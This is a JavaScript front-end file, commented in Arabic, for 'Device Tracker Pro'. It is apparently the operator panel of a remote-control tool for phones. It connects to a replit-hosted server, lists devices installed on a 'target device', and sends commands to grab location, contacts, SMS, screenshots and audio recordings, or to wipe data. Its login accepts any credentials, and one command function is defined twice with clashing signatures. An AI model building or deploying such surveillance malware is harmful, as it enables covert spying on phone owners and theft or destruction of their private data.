// ============================================
// 🔧 إعدادات التطبيق
// ============================================

const SERVER_URL = 'https://624bf379-8f9d-4beb-8812-30e54011173d-00-2416evv3w9ocf.janeway.replit.dev';
const CHECK_IN_INTERVAL = 30000;

let currentUser = null;
let devices = [];
let logs = [];
let selectedDevice = null;

// ============================================
// 🚀 تهيئة التطبيق
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    initializeApp();
    loadSavedData();
    setupEventListeners();
});

function initializeApp() {
    console.log('🚀 Device Tracker Pro initialized');
    checkAuth();
}

function loadSavedData() {
    const savedUser = localStorage.getItem('currentUser');
    const savedLogs = localStorage.getItem('appLogs');
    
    if (savedUser) {
        currentUser = JSON.parse(savedUser);
    }
    
    if (savedLogs) {
        logs = JSON.parse(savedLogs);
        renderLogs();
    }
}

function setupEventListeners() {
    // زر تسجيل الدخول
    document.getElementById('loginBtn')?.addEventListener('click', handleLogin);
    
    // Enter key في حقول التسجيل
    document.getElementById('adminUsername')?.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') handleLogin();
    });
        document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') handleLogin();
    });
    
    // Toggle الوضع الليلي
    document.getElementById('darkModeToggle')?.addEventListener('change', toggleDarkMode);
}

// ============================================
// 🔐 المصادقة
// ============================================

function checkAuth() {
    if (currentUser) {
        showDashboard();
    } else {
        showLogin();
    }
}

function handleLogin() {
    const username = document.getElementById('adminUsername').value;
    const password = document.getElementById('adminPassword').value;
    
    if (!username || !password) {
        showNotification('الرجاء إدخال اسم المستخدم وكلمة المرور', 'error');
        return;
    }
    
    // محاكاة تسجيل الدخول (في الإنتاج استخدم API حقيقي)
    const btn = document.getElementById('loginBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحميل...';
    btn.disabled = true;
    
    setTimeout(() => {
        currentUser = { username, loginTime: new Date() };
        localStorage.setItem('currentUser', JSON.stringify(currentUser));
        
        showNotification('تم تسجيل الدخول بنجاح', 'success');
        showDashboard();
        
        btn.innerHTML = `
            <span class="btn-text">تسجيل الدخول</span>
            <span class="btn-icon"><i class="fas fa-arrow-left"></i></span>
            <div class="btn-shine"></div>
        `;
        btn.disabled = false;
    }, 1500);
}
function logout() {
    if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
        currentUser = null;
        localStorage.removeItem('currentUser');
        showLogin();
        showNotification('تم تسجيل الخروج', 'success');
        toggleSidebar();
    }
}

// ============================================
// 📱 إدارة الشاشات
// ============================================

function showLogin() {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById('loginScreen').classList.add('active');
}

function showDashboard() {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById('dashboardScreen').classList.add('active');
    loadDevices();
}

function showSection(sectionId) {
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.getElementById(sectionId + 'Section').classList.add('active');
    
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    event.currentTarget.classList.add('active');
    
    toggleSidebar();
    
    if (sectionId === 'devices') loadDevices();
    if (sectionId === 'logs') renderLogs();
}

function toggleSidebar() {
    document.getElementById('sidebar').classList.toggle('active');
}

function toggleProfileMenu() {
    // يمكن إضافة قائمة منسدلة هنا
    showNotification('ملف المستخدم', 'success');
}

// ============================================
// 📊 إدارة الأجهزة
// ============================================
async function loadDevices() {
    const grid = document.getElementById('devicesGrid');
    grid.innerHTML = '<div class="loading"><i class="fas fa-spinner fa-spin"></i> جاري التحميل...</div>';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/devices`);
        const data = await response.json();
        
        if (data.success) {
            devices = data.devices;
            renderDevices();
        } else {
            throw new Error('فشل تحميل الأجهزة');
        }
    } catch (error) {
        console.error('خطأ في تحميل الأجهزة:', error);
        grid.innerHTML = `
            <div class="error-message">
                <i class="fas fa-exclamation-triangle"></i>
                <p>فشل تحميل الأجهزة</p>
                <button onclick="loadDevices()">إعادة المحاولة</button>
            </div>
        `;
    }
}

function renderDevices() {
    const grid = document.getElementById('devicesGrid');
    
    if (devices.length === 0) {
        grid.innerHTML = `
            <div class="no-devices">
                <i class="fas fa-mobile-alt"></i>
                <h3>لا توجد أجهزة متصلة</h3>
                <p>قم بتثبيت التطبيق على الجهاز الهدف ليظهر هنا</p>
            </div>
        `;
        return;
    }
    
    grid.innerHTML = devices.map(device => `
        <div class="device-card ${device.status === 'active' ? 'online' : 'offline'}" 
             onclick="openDeviceModal('${device.deviceId}')">
            <div class="device-header">
                <div class="device-icon">
                    <i class="fas fa-mobile-alt"></i>
                </div>
                <div class="device-info">
                    <h3>${device.deviceInfo?.deviceName || 'جهاز غير معروف'}</h3>                    <p>${device.deviceId.substring(0, 12)}...</p>
                </div>
            </div>
            
            <div class="device-status ${device.status === 'active' ? 'online' : 'offline'}">
                <span class="status-dot"></span>
                <span>${device.status === 'active' ? 'متصل' : 'غير متصل'}</span>
            </div>
            
            <div class="device-details">
                <div class="detail-item">
                    <span class="detail-label">آخر اتصال</span>
                    <span class="detail-value">${formatDate(device.lastCheckIn)}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">مسجل منذ</span>
                    <span class="detail-value">${formatDate(device.registeredAt)}</span>
                </div>
            </div>
            
            <div class="device-actions">
                <button class="btn-device-action" onclick="event.stopPropagation(); sendQuickCommand('${device.deviceId}', 'get_location')">
                    <i class="fas fa-map-marker-alt"></i>
                    الموقع
                </button>
                <button class="btn-device-action" onclick="event.stopPropagation(); sendQuickCommand('${device.deviceId}', 'get_system_info')">
                    <i class="fas fa-info-circle"></i>
                    معلومات
                </button>
                <button class="btn-device-action danger" onclick="event.stopPropagation(); sendQuickCommand('${device.deviceId}', 'wipe_data')">
                    <i class="fas fa-trash"></i>
                    مسح
                </button>
            </div>
        </div>
    `).join('');
}

function refreshDevices() {
    showNotification('جاري تحديث الأجهزة...', 'success');
    loadDevices();
}

// ============================================
// 🎮 الأوامر المخصصة
// ============================================

function insertCommand(commandType) {
    const textarea = document.getElementById('customCommand');
    const commands = {        'get_location': `{
  "type": "get_location",
  "priority": "high"
}`,
        'get_system_info': `{
  "type": "get_system_info",
  "include": ["battery", "network", "storage"]
}`,
        'take_screenshot': `{
  "type": "take_screenshot",
  "quality": "high"
}`,
        'get_contacts': `{
  "type": "get_contacts",
  "limit": 100
}`,
        'get_sms': `{
  "type": "get_sms",
  "limit": 50
}`,
        'record_audio': `{
  "type": "record_audio",
  "duration": 30
}`
    };
    
    textarea.value = commands[commandType] || '';
    textarea.focus();
    showNotification('تم إدراج الأمر', 'success');
}

function clearCommand() {
    document.getElementById('customCommand').value = '';
    showNotification('تم مسح الأمر', 'success');
}

async function sendCustomCommand() {
    const commandText = document.getElementById('customCommand').value;
    
    if (!commandText.trim()) {
        showNotification('الرجاء كتابة أمر', 'error');
        return;
    }
    
    try {
        const command = JSON.parse(commandText);
        
        if (!selectedDevice) {
            showNotification('الرجاء اختيار جهاز أولاً', 'error');
            return;        }
        
        await sendCommandToDevice(selectedDevice, command);
        
        // إضافة للسجل
        addToCommandHistory(command);
        
        showNotification('تم إرسال الأمر بنجاح', 'success');
        clearCommand();
    } catch (error) {
        showNotification('أمر غير صالح: ' + error.message, 'error');
    }
}

function addToCommandHistory(command) {
    const historyList = document.querySelector('.history-list');
    const item = document.createElement('div');
    item.className = 'history-item';
    item.innerHTML = `
        <div><strong>${command.type}</strong></div>
        <div style="color: var(--text-muted); font-size: 12px;">${new Date().toLocaleTimeString('ar-SA')}</div>
    `;
    historyList.insertBefore(item, historyList.firstChild);
}

async function sendQuickCommand(deviceId, commandType) {
    const command = { type: commandType };
    await sendCommandToDevice(deviceId, command);
    addLog(`أمر ${commandType} أُرسل للجهاز`, 'success', deviceId);
}

async function sendCommandToDevice(deviceId, command) {
    try {
        const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                deviceId,
                command: command
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            addLog(`تم إرسال الأمر: ${command.type}`, 'success', deviceId);
        } else {
            throw new Error(data.error);
        }
    } catch (error) {        addLog(`فشل إرسال الأمر: ${error.message}`, 'error', deviceId);
        showNotification('فشل إرسال الأمر', 'error');
    }
}

// ============================================
// 📋 السجلات
// ============================================

function addLog(message, type = 'info', deviceId = null) {
    const log = {
        message,
        type,
        deviceId,
        timestamp: new Date().toISOString()
    };
    
    logs.unshift(log);
    if (logs.length > 100) logs.pop();
    
    localStorage.setItem('appLogs', JSON.stringify(logs));
    renderLogs();
}

function renderLogs() {
    const container = document.getElementById('logsContainer');
    
    if (logs.length === 0) {
        container.innerHTML = `
            <div class="log-empty">
                <i class="fas fa-inbox"></i>
                <p>لا توجد سجلات بعد</p>
            </div>
        `;
        return;
    }
    
    container.innerHTML = logs.map(log => `
        <div class="log-item ${log.type}">
            <div class="log-content">
                <div class="log-message">${log.message}</div>
                <div class="log-time">${formatDate(log.timestamp)}</div>
            </div>
            ${log.deviceId ? `<div class="log-device">${log.deviceId.substring(0, 8)}...</div>` : ''}
        </div>
    `).join('');
}

function clearAllLogs() {
    if (confirm('هل أنت متأكد من مسح جميع السجلات؟')) {        logs = [];
        localStorage.removeItem('appLogs');
        renderLogs();
        showNotification('تم مسح السجلات', 'success');
    }
}

// ============================================
// 🗂️ النوافذ المنبثقة
// ============================================

function openDeviceModal(deviceId) {
    selectedDevice = deviceId;
    const device = devices.find(d => d.deviceId === deviceId);
    
    if (!device) return;
    
    const modalBody = document.getElementById('deviceModalBody');
    modalBody.innerHTML = `
        <div class="device-detail-grid">
            <div class="detail-row">
                <span class="detail-label">معرف الجهاز:</span>
                <span class="detail-value">${device.deviceId}</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">اسم الجهاز:</span>
                <span class="detail-value">${device.deviceInfo?.deviceName || 'غير معروف'}</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">الحالة:</span>
                <span class="detail-value ${device.status === 'active' ? 'online' : 'offline'}">
                    ${device.status === 'active' ? '✅ متصل' : '❌ غير متصل'}
                </span>
            </div>
            <div class="detail-row">
                <span class="detail-label">آخر اتصال:</span>
                <span class="detail-value">${formatDate(device.lastCheckIn)}</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">مسجل منذ:</span>
                <span class="detail-value">${formatDate(device.registeredAt)}</span>
            </div>
        </div>
    `;
    
    document.getElementById('deviceModal').classList.add('active');
}

function closeDeviceModal() {
    document.getElementById('deviceModal').classList.remove('active');    selectedDevice = null;
}

function sendCommandToDevice(commandType) {
    if (!selectedDevice) return;
    sendQuickCommand(selectedDevice, commandType);
    closeDeviceModal();
}

// ============================================
// ⚙️ الإعدادات
// ============================================

function editServerUrl() {
    const newUrl = prompt('أدخل رابط الخادم الجديد:', SERVER_URL);
    if (newUrl) {
        document.getElementById('serverUrlDisplay').textContent = newUrl;
        showNotification('تم تحديث رابط الخادم', 'success');
    }
}

function editCheckInInterval() {
    const newInterval = prompt('أدخل فترة الاتصال بالثواني:', '30');
    if (newInterval) {
        showNotification('تم تحديث فترة الاتصال', 'success');
    }
}

function toggleDarkMode() {
    document.body.classList.toggle('dark-mode');
    showNotification('تم تغيير الوضع', 'success');
}

// ============================================
// 🔔 الإشعارات
// ============================================

function showNotification(message, type = 'info') {
    const container = document.getElementById('notificationContainer');
    const icons = {
        success: 'fa-check-circle',
        error: 'fa-exclamation-circle',
        warning: 'fa-exclamation-triangle',
        info: 'fa-info-circle'
    };
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
        <i class="fas ${icons[type]}"></i>        <span>${message}</span>
    `;
    
    container.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

// ============================================
// 📅 دوال مساعدة
// ============================================

function formatDate(dateString) {
    if (!dateString) return '---';
    const date = new Date(dateString);
    return date.toLocaleString('ar-SA', {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
}

// ============================================
// 🔄 الاتصال الدوري
// ============================================

setInterval(async () => {
    if (currentUser) {
        await loadDevices();
    }
}, CHECK_IN_INTERVAL);